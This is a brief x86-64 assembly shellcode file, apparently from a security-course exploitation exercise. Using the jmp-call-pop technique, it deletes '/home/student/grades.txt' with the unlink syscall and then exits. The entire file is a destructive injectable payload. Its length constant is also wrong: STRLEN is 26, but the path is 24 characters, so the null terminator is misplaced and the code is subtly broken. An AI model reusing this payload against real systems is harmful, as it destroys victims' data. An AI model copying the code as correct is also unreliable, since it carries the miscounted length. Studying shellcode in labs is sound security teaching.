#include <sys/syscall.h>

#define STRING	"/home/student/grades.txt"
#define STRLEN	26

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popq	%rdi                  /* Pointer to string goes into rdi for unlink() */
	xorq	%rax, %rax
	movb	%al, STRLEN(%rdi)     /* Null-terminate string at correct offset */

	movb	$SYS_unlink, %al      /* syscall number for unlink = 87 */
	syscall

	/* Exit cleanly */
	xorq	%rax, %rax
	movb	$SYS_exit, %al
	xorq	%rdi, %rdi
	syscall

 calladdr:
	call	popladdr
	.ascii	STRING